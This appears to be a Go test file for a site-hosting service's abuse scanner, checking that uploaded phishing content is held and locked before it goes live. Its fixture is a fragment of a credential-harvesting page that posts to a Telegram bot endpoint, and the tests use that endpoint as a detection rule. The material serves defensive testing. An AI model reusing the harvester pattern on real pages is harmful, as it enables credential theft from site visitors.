package store

import (
	"bytes"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/ittrail/sitebin.io/internal/abuse"
)

// kit is enough of the 2026-09-25 Telegram harvester to block.
const kit = `<html><head><title>Account Verification</title></head><body>
<input type="password" id="password">
<script>fetch("https://api.telegram.org/bot8874059130:AAG/sendMessage")</script></body></html>`

// hookLog records the guard's decisions.
type hookLog struct {
	mu     sync.Mutex
	events []ScanEvent
	// during runs inside the hook, while the verdict has been written and
	// the file has not yet moved into place.
	during func(ScanEvent)
}

func (h *hookLog) hook(ev ScanEvent) {
	h.mu.Lock()
	h.events = append(h.events, ev)
	h.mu.Unlock()
	if h.during != nil {
		h.during(ev)
	}
}

func (h *hookLog) decisions() []string {
	h.mu.Lock()
	defer h.mu.Unlock()
	var out []string
	for _, e := range h.events {
		out = append(out, e.Decision)
	}
	return out
}

func guardedStore(t *testing.T) (*Store, *hookLog) {
	t.Helper()
	s := newTestStore(t)
	h := &hookLog{}
	s.SetScanHook(h.hook)
	return s, h
}

func reload(t *testing.T, s *Store, site *Site) *Site {
	t.Helper()
	got, err := s.ByViewID(site.ViewID)
	if err != nil {
		t.Fatal(err)
	}
	return got
}

func exists(site *Site, rel string) bool {
	_, err := os.Stat(filepath.Join(site.ContentDir(), filepath.FromSlash(rel)))
	return err == nil
}

// The whole point: the lock is on disk before the kit is anywhere a request
// could reach it.
func TestHeldBeforeVisible(t *testing.T) {
	s, h := guardedStore(t)
	site, _, _ := s.Create()
	h.during = func(ev ScanEvent) {
		if !ev.Held() {
			return
		}
		m, err := readMeta(site.Dir())
		if err != nil || m.Locked == nil || m.Locked.By != LockByScanner {
			t.Errorf("the lock is not in meta.json when the hold is reported: %+v %v", m.Locked, err)
		}
		if exists(site, "index.html") {
			t.Error("the kit is already in place while the verdict is settled")
		}
	}
	err := s.SaveFile(site, "index.html", strings.NewReader(kit))
	var held *HeldError
	if !errors.As(err, &held) || !errors.Is(err, ErrHeld) {
		t.Fatalf("SaveFile = %v, want a HeldError", err)
	}
	if !strings.Contains(err.Error(), "held for review") || !strings.Contains(err.Error(), "index.html") {
		t.Errorf("message %q", err)
	}
	got := reload(t, s, site)
	if got.Meta.Locked == nil || got.Meta.Locked.By != LockByScanner {
		t.Fatalf("lock = %+v", got.Meta.Locked)
	}
	if !exists(got, "index.html") {
		t.Error("the kit must be kept as evidence")
	}
	if got.Meta.Abuse == nil || len(got.Meta.Abuse.Findings) == 0 {
		t.Fatal("no findings recorded")
	}
	f := got.Meta.Abuse.Findings[0]
	if f.Path != "index.html" || f.SHA256 == "" || f.Source != FindingUpload || f.At.IsZero() {
		t.Errorf("finding %+v", f)
	}
	if d := h.decisions(); len(d) != 1 || d[0] != DecisionHeld {
		t.Errorf("decisions %v", d)
	}
}

func TestCleanUploadsTouchNothing(t *testing.T) {
	s, h := guardedStore(t)
	site, _, _ := s.Create()
	if err := s.SaveFile(site, "index.html", strings.NewReader(`<form><input type="password"></form>`)); err != nil {
		t.Fatal(err)
	}
	got := reload(t, s, site)
	if got.Meta.Locked != nil || got.Meta.Abuse != nil || len(h.decisions()) != 0 {
		t.Fatalf("a clean upload changed something: %+v %+v %v", got.Meta.Locked, got.Meta.Abuse, h.decisions())
	}
	b, _ := os.ReadFile(metaPath(site.Dir()))
	if bytes.Contains(b, []byte(`"abuse"`)) {
		t.Error("a site without hits writes an abuse key")
	}
}

func TestExemptions(t *testing.T) {
	cases := map[string]struct {
		prep func(*Store, *Site)
		want string
	}{
		"trusted tier": {func(s *Store, site *Site) { s.SetTrusted(site, true) }, DecisionTrusted},
		"container": {func(s *Store, site *Site) {
			s.Update(site, func(m *Meta) error { m.Mode = ModeContainer; return nil })
		}, DecisionContainer},
		"operator": {func(s *Store, site *Site) {
			s.SetOperatorCheck(func(owner string) bool { return owner == "op" })
			s.Update(site, func(m *Meta) error { m.OwnerAccountID = "op"; return nil })
		}, DecisionOperator},
		"already locked": {func(s *Store, site *Site) {
			s.SetLock(site, &SiteLock{By: LockByAdmin, Reason: "mine"})
		}, DecisionLocked},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			s, h := guardedStore(t)
			site, _, _ := s.Create()
			c.prep(s, site)
			site = reload(t, s, site)
			if err := s.SaveFile(site, "index.html", strings.NewReader(kit)); err != nil {
				t.Fatalf("SaveFile = %v", err)
			}
			got := reload(t, s, site)
			if name == "already locked" {
				if got.Meta.Locked == nil || got.Meta.Locked.By != LockByAdmin || got.Meta.Locked.Reason != "mine" {
					t.Errorf("the operator's lock was replaced: %+v", got.Meta.Locked)
				}
			} else if got.Meta.Locked != nil {
				t.Errorf("locked: %+v", got.Meta.Locked)
			}
			if got.Meta.Abuse == nil || len(got.Meta.Abuse.Findings) == 0 {
				t.Error("an exempt site still has its findings recorded")
			}
			if d := h.decisions(); len(d) != 1 || d[0] != c.want {
				t.Errorf("decisions %v, want %s", d, c.want)
			}
		})
	}
}

func TestFlagsDoNotHold(t *testing.T) {
	s, h := guardedStore(t)
	site, _, _ := s.Create()
	if err := s.SaveFile(site, "pay.html", strings.NewReader(`<a href="upi://pay?pa=shop@okaxis">UPI</a>`)); err != nil {
		t.Fatal(err)
	}
	// a blocking rule outside an active file is a flag too
	if err := s.SaveFile(site, "notes.txt", strings.NewReader(kit)); err != nil {
		t.Fatal(err)
	}
	got := reload(t, s, site)
	if got.Meta.Locked != nil {
		t.Fatal("a flag locked the site")
	}
	for _, f := range got.Meta.Abuse.Findings {
		if f.Severity != string(abuse.Flag) {
			t.Errorf("finding %+v is not a flag", f)
		}
	}
	if d := h.decisions(); len(d) != 2 || d[0] != DecisionFlagged || d[1] != DecisionFlagged {
		t.Errorf("decisions %v", d)
	}
}

// A release is remembered by content: the same bytes again are left alone,
// anything else is scanned — and held — as usual.
func TestReleasedContentIsNotHeldAgain(t *testing.T) {
	s, h := guardedStore(t)
	site, _, _ := s.Create()
	if err := s.SaveFile(site, "index.html", strings.NewReader(kit)); !errors.Is(err, ErrHeld) {
		t.Fatalf("first upload = %v", err)
	}
	if _, err := s.SetLock(site, nil); err != nil { // the operator's unlock
		t.Fatal(err)
	}
	got := reload(t, s, site)
	if got.Meta.Locked != nil || len(got.Meta.Abuse.Findings) != 0 || len(got.Meta.Abuse.Reviewed) != 1 {
		t.Fatalf("after release: lock %+v abuse %+v", got.Meta.Locked, got.Meta.Abuse)
	}
	if err := s.SaveFile(got, "copy/index.html", strings.NewReader(kit)); err != nil {
		t.Fatalf("the reviewed content, uploaded again: %v", err)
	}
	got = reload(t, s, site)
	if got.Meta.Locked != nil || len(got.Meta.Abuse.Findings) != 0 {
		t.Fatalf("reviewed content re-held or re-recorded: %+v %+v", got.Meta.Locked, got.Meta.Abuse)
	}
	if err := s.SaveFile(got, "index.html", strings.NewReader(kit+"<!-- v2 -->")); !errors.Is(err, ErrHeld) {
		t.Fatalf("new content must be held again: %v", err)
	}
	if d := h.decisions(); len(d) != 3 || d[1] != DecisionReviewed || d[2] != DecisionHeld {
		t.Errorf("decisions %v", d)
	}
}

// An unsuspension is not a review.
func TestAccountReleaseReviewsNothing(t *testing.T) {
	s, _ := guardedStore(t)
	site, _, _ := s.Create()
	s.SetTrusted(site, true)
	s.SaveFile(site, "index.html", strings.NewReader(kit))
	s.SetLock(site, &SiteLock{By: LockByAccount})
	if released, err := s.ReleaseLock(site, LockByAccount); err != nil || !released {
		t.Fatal(released, err)
	}
	got := reload(t, s, site)
	if len(got.Meta.Abuse.Findings) == 0 || len(got.Meta.Abuse.Reviewed) != 0 {
		t.Errorf("abuse %+v", got.Meta.Abuse)
	}
}

func TestClearFindingsReviews(t *testing.T) {
	s, _ := guardedStore(t)
	site, _, _ := s.Create()
	s.SetTrusted(site, true)
	s.SaveFile(site, "index.html", strings.NewReader(kit))
	if cleared, err := s.ClearFindings(site); err != nil || !cleared {
		t.Fatal(cleared, err)
	}
	got := reload(t, s, site)
	if len(got.Meta.Abuse.Findings) != 0 || len(got.Meta.Abuse.Reviewed) != 1 {
		t.Fatalf("abuse %+v", got.Meta.Abuse)
	}
	if cleared, _ := s.ClearFindings(site); cleared {
		t.Error("nothing left to clear")
	}
}

func TestFindingsAreBoundedAndDeduplicated(t *testing.T) {
	s, _ := guardedStore(t)
	site, _, _ := s.Create()
	s.SetTrusted(site, true)
	s.SaveFile(site, "a.html", strings.NewReader(kit))
	s.SaveFile(site, "a.html", strings.NewReader(kit+" "))
	got := reload(t, s, site)
	seen := map[string]int{}
	for _, f := range got.Meta.Abuse.Findings {
		seen[f.Rule+"|"+f.Path]++
	}
	for k, n := range seen {
		if n > 1 {
			t.Errorf("%s recorded %d times", k, n)
		}
	}
	for i := 0; i < 30; i++ {
		s.SaveFile(site, "p/"+string(rune('a'+i%26))+string(rune('a'+i/26))+".html", strings.NewReader(kit))
	}
	got = reload(t, s, site)
	if n := len(got.Meta.Abuse.Findings); n != maxFindings {
		t.Errorf("%d findings kept, want %d", n, maxFindings)
	}
}

func TestZipIsHeldPerEntry(t *testing.T) {
	s, _ := guardedStore(t)
	site, _, _ := s.Create()
	z := makeZip(t, map[string]string{"index.html": kit}, false)
	err := s.ExtractZip(site, bytes.NewReader(z), int64(len(z)))
	if !errors.Is(err, ErrHeld) {
		t.Fatalf("ExtractZip = %v", err)
	}
	var held *HeldError
	if !errors.As(err, &held) {
		t.Fatal("the zip error must carry the hold")
	}
	got := reload(t, s, site)
	if got.Meta.Locked == nil || !exists(got, "index.html") {
		t.Fatalf("lock %+v", got.Meta.Locked)
	}
}

func TestReplaceIsSettledBeforeCommit(t *testing.T) {
	s, h := guardedStore(t)
	site, _, _ := s.Create()
	s.SaveFile(site, "old.html", strings.NewReader("<p>old</p>"))
	h.during = func(ev ScanEvent) {
		if ev.Held() && exists(site, "index.html") {
			t.Error("a staged file moved in before the verdict")
		}
	}
	rep, err := s.BeginReplace(site)
	if err != nil {
		t.Fatal(err)
	}
	defer rep.Abort()
	if err := rep.SaveFile("index.html", strings.NewReader(kit)); err != nil {
		t.Fatalf("staging never fails on a hit: %v", err)
	}
	if err := rep.SaveFile("style.css", strings.NewReader("body{}")); err != nil {
		t.Fatal(err)
	}
	if got := reload(t, s, site); got.Meta.Locked != nil {
		t.Fatal("staging is not visible, so it locks nothing yet")
	}
	if err := rep.Commit(); !errors.Is(err, ErrHeld) {
		t.Fatalf("Commit = %v", err)
	}
	got := reload(t, s, site)
	if got.Meta.Locked == nil || !exists(got, "index.html") || exists(got, "old.html") {
		t.Fatalf("after a held commit: lock %+v", got.Meta.Locked)
	}
}

func TestReplaceUsesTheLastWriteOfAPath(t *testing.T) {
	s, _ := guardedStore(t)
	site, _, _ := s.Create()
	rep, _ := s.BeginReplace(site)
	defer rep.Abort()
	rep.SaveFile("index.html", strings.NewReader(kit))
	rep.SaveFile("index.html", strings.NewReader("<p>fixed</p>"))
	if err := rep.Commit(); err != nil {
		t.Fatalf("the kit was overwritten before the commit: %v", err)
	}
	if got := reload(t, s, site); got.Meta.Locked != nil {
		t.Fatal("held for content that is not committed")
	}
}

func TestStagedFileIsSettledOnClose(t *testing.T) {
	for _, lockHeld := range []bool{false, true} {
		s, h := guardedStore(t)
		site, _, _ := s.Create()
		h.during = func(ev ScanEvent) {
			if ev.Held() && exists(site, "index.html") {
				t.Error("the staged file is visible before the verdict")
			}
		}
		var closeErr error
		run := func() error {
			f, err := s.OpenStaged(site, "index.html", os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0o644, lockHeld)
			if err != nil {
				return err
			}
			f.Write([]byte(kit))
			if exists(site, "index.html") {
				t.Error("written bytes are visible before Close")
			}
			closeErr = f.Close()
			return nil
		}
		if lockHeld {
			s.WithLock(site.ViewID, run)
		} else if err := run(); err != nil {
			t.Fatal(err)
		}
		if !errors.Is(closeErr, ErrHeld) {
			t.Fatalf("lockHeld=%v: Close = %v", lockHeld, closeErr)
		}
		got := reload(t, s, site)
		if got.Meta.Locked == nil || !exists(got, "index.html") {
			t.Errorf("lockHeld=%v: lock %+v", lockHeld, got.Meta.Locked)
		}
		assertNoTemp(t, got)
	}
}

func assertNoTemp(t *testing.T, site *Site) {
	t.Helper()
	filepath.WalkDir(site.ContentDir(), func(p string, d os.DirEntry, err error) error {
		if err == nil && strings.Contains(d.Name(), ".sbtmp") {
			t.Errorf("temp file left behind: %s", p)
		}
		return nil
	})
}

func TestStagedFileAppendsAndResumes(t *testing.T) {
	s, _ := guardedStore(t)
	site, _, _ := s.Create()
	s.SaveFile(site, "a.txt", strings.NewReader("hello"))
	f, err := s.OpenStaged(site, "a.txt", os.O_WRONLY|os.O_APPEND, 0o644, false)
	if err != nil {
		t.Fatal(err)
	}
	f.Write([]byte(" world"))
	if err := f.Close(); err != nil {
		t.Fatal(err)
	}
	f, _ = s.OpenStaged(site, "a.txt", os.O_WRONLY, 0o644, false)
	f.WriteAt([]byte("J"), 0)
	f.Close()
	if b, _ := s.ReadContentFile(site, "a.txt"); string(b) != "Jello world" {
		t.Fatalf("content %q", b)
	}
	// opened for writing and never written: nothing is committed or left
	f, _ = s.OpenStaged(site, "a.txt", os.O_RDWR, 0, false)
	if err := f.Close(); err != nil {
		t.Fatal(err)
	}
	assertNoTemp(t, site)
	if _, err := s.OpenStaged(site, "missing.txt", os.O_WRONLY, 0, false); !os.IsNotExist(err) {
		t.Errorf("no O_CREATE on a missing file: %v", err)
	}
	if _, err := s.OpenStaged(site, "nodir/x.txt", os.O_WRONLY|os.O_CREATE, 0o644, false); !os.IsNotExist(err) {
		t.Errorf("a missing folder: %v", err)
	}
}

func TestStagedFileRefusedWhenLockedMidTransfer(t *testing.T) {
	s, _ := guardedStore(t)
	site, _, _ := s.Create()
	f, _ := s.OpenStaged(site, "index.html", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0o644, false)
	f.Write([]byte("<p>hi</p>"))
	s.SetLock(site, &SiteLock{By: LockByAdmin})
	if err := f.Close(); !errors.Is(err, ErrLocked) {
		t.Fatalf("Close = %v", err)
	}
	if exists(site, "index.html") {
		t.Error("a write into a site locked mid-transfer went in")
	}
	assertNoTemp(t, site)
}

func TestRenameToAnActiveNameIsChecked(t *testing.T) {
	s, _ := guardedStore(t)
	site, _, _ := s.Create()
	if err := s.SaveFile(site, "kit.txt", strings.NewReader(kit)); err != nil {
		t.Fatalf("a .txt only flags: %v", err)
	}
	if got := reload(t, s, site); got.Meta.Locked != nil {
		t.Fatal("locked by a .txt")
	}
	err := s.RenameChecked(site, "kit.txt", "kit.html", false)
	if !errors.Is(err, ErrHeld) {
		t.Fatalf("RenameChecked = %v", err)
	}
	got := reload(t, s, site)
	if got.Meta.Locked == nil || !exists(got, "kit.html") {
		t.Fatalf("lock %+v", got.Meta.Locked)
	}
	// same extension, or a folder: renamed as they are
	s2, h2 := guardedStore(t)
	site2, _, _ := s2.Create()
	s2.SaveFile(site2, "d/a.html", strings.NewReader("<p>x</p>"))
	if err := s2.RenameChecked(site2, "d/a.html", "d/b.html", false); err != nil {
		t.Fatal(err)
	}
	if err := s2.RenameChecked(site2, "d", "e", false); err != nil {
		t.Fatal(err)
	}
	if !exists(site2, "e/b.html") || len(h2.decisions()) != 0 {
		t.Errorf("decisions %v", h2.decisions())
	}
}

func TestCheckExfilVerifiesAgainstTheSitesFiles(t *testing.T) {
	d, ok := abuse.Defaults().Destination("https://api.telegram.org/bot1/sendMessage")
	if !ok {
		t.Fatal("no destination")
	}
	blocked := "https://api.telegram.org/bot8874059130:AAG/sendMessage"

	// the site's content references it: held
	s, _ := guardedStore(t)
	site, _, _ := s.Create()
	s.SetScanner(nil) // content from before the scanner existed
	s.SaveFile(site, "x/y.js", strings.NewReader(`fetch("https://api.telegram.org/bot"+t)`))
	s.SaveFile(site, "index.html", strings.NewReader("<p>hi</p>"))
	s.SetScanner(abuse.NewLoader(""))
	ev, err := s.CheckExfil(reload(t, s, site), d, blocked)
	if err != nil {
		t.Fatal(err)
	}
	got := reload(t, s, site)
	if !ev.Held() || got.Meta.Locked == nil || got.Meta.Locked.By != LockByScanner {
		t.Fatalf("event %+v lock %+v", ev, got.Meta.Locked)
	}
	if !strings.Contains(got.Meta.Locked.Reason, "api.telegram.org") {
		t.Errorf("reason %q", got.Meta.Locked.Reason)
	}
	var csp bool
	for _, f := range got.Meta.Abuse.Findings {
		if f.Source == FindingCSP && f.Rule == "csp:telegram-bot" && f.Path == "x/y.js" && strings.Contains(f.Excerpt, "api.telegram.org/bot8874059130") {
			csp = true
		}
	}
	if !csp {
		t.Errorf("findings %+v", got.Meta.Abuse.Findings)
	}

	// a forged report against a site that never references it: nothing
	s, h := guardedStore(t)
	site, _, _ = s.Create()
	s.SaveFile(site, "index.html", strings.NewReader("<p>my portfolio</p>"))
	ev, err = s.CheckExfil(site, d, blocked)
	if err != nil {
		t.Fatal(err)
	}
	got = reload(t, s, site)
	if ev.Decision != DecisionUnverified || got.Meta.Locked != nil || got.Meta.Abuse != nil {
		t.Fatalf("forged report acted on: %+v %+v", ev, got.Meta)
	}
	if d := h.decisions(); len(d) != 1 || d[0] != DecisionUnverified {
		t.Errorf("decisions %v", d)
	}

	// a trusted site that does reference it: recorded and alerted, not locked
	s, _ = guardedStore(t)
	site, _, _ = s.Create()
	s.SetTrusted(site, true)
	s.SaveFile(site, "bot.js", strings.NewReader(`fetch("https://api.telegram.org/bot"+t)`))
	ev, _ = s.CheckExfil(reload(t, s, site), d, blocked)
	if ev.Decision != DecisionTrusted || reload(t, s, site).Meta.Locked != nil {
		t.Errorf("trusted: %+v", ev)
	}
}

func TestScanSiteAndApply(t *testing.T) {
	s, _ := guardedStore(t)
	site, _, _ := s.Create()
	s.SetScanner(nil) // content that predates the scanner
	s.SaveFile(site, "index.html", strings.NewReader(kit))
	s.SaveFile(site, "img/logo.png", bytes.NewReader([]byte("\x89PNG\x00\x00")))
	s.SetScanner(abuse.NewLoader(""))
	results, err := s.ScanSite(site)
	if err != nil || len(results) != 1 || results[0].Path != "index.html" {
		t.Fatalf("ScanSite = %+v, %v", results, err)
	}
	if got := reload(t, s, site); got.Meta.Locked != nil || got.Meta.Abuse != nil {
		t.Fatal("ScanSite must not write")
	}
	ev, err := s.ApplyScan(site, results)
	if err != nil || !ev.Held() {
		t.Fatalf("ApplyScan = %+v, %v", ev, err)
	}
	if got := reload(t, s, site); got.Meta.Locked == nil || got.Meta.Abuse.Findings[0].Source != FindingScan {
		t.Fatalf("after ApplyScan: %+v", got.Meta)
	}
}

func TestRulesFileInTheDataDirIsUsed(t *testing.T) {
	s, _ := guardedStore(t)
	os.WriteFile(filepath.Join(s.Root(), AbuseRulesFile), []byte(`{"rules": [{"id": "house-kit", "severity": "block", "all": ["evilmarker-7"]}]}`), 0o644)
	site, _, _ := s.Create()
	if err := s.SaveFile(site, "index.html", strings.NewReader("<p>evilmarker-7</p>")); !errors.Is(err, ErrHeld) {
		t.Fatalf("SaveFile = %v", err)
	}
}
